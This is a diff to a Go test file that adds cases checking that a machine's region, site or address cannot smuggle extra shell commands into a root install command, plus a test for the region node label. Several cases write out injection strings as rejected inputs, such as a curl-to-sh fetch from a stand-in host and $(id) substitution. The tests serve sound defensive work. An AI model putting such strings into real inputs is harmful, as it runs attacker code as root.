@@ -155,6 +155,12 @@ func TestASiteOrAddressCannotEndTheCommand(t *testing.T) {
 		{"ipv6", Machine{PublicIP: "2001:db8::7"}, true},
 		{"everything", Machine{Pool: "web", Site: "dar-b", PublicIP: "198.51.100.2"}, true},
 
+		{"region", Machine{Region: "dar"}, true},
+		{"site and region", Machine{Site: "dar-a", Region: "dar"}, true},
+		{"region with a command", Machine{Region: "dar; curl evil.sh | sh"}, false},
+		{"region with a substitution", Machine{Region: "dar$(id)"}, false},
+		{"region with a newline", Machine{Region: "dar\nid"}, false},
+		{"uppercase region", Machine{Region: "DAR"}, false},
 		{"site with a command", Machine{Site: "dar; curl evil.sh | sh"}, false},
 		{"uppercase site", Machine{Site: "DAR-A"}, false},
 		{"address with a command", Machine{PublicIP: "203.0.113.7;id"}, false},
@@ -173,6 +179,22 @@ func TestASiteOrAddressCannotEndTheCommand(t *testing.T) {
 				t.Fatalf("Validate(%+v) was accepted — it would run in a root shell", tc.m)
 			}
 		})
+	}
+}
+
+// A region is the region label an app's pods are required to run on, set by
+// the agent on itself like the site.
+func TestTheCommandCarriesTheRegion(t *testing.T) {
+	got := BuildCommand("https://203.0.113.1:6443", "t", Machine{Site: "dar-b", Region: "dar"})
+	want := "--node-label topology.kubernetes.io/region=dar"
+	if !strings.Contains(got, want) {
+		t.Fatalf("command is missing %q:\n%s", want, got)
+	}
+	if strings.Index(got, "sh -s -") > strings.Index(got, want) {
+		t.Fatalf("the region is not passed to the agent:\n%s", got)
+	}
+	if got := BuildCommand("https://10.0.0.1:6443", "t", Machine{Site: "dar-b"}); strings.Contains(got, "region") {
+		t.Errorf("a machine with no region was given one:\n%s", got)
 	}
 }
 
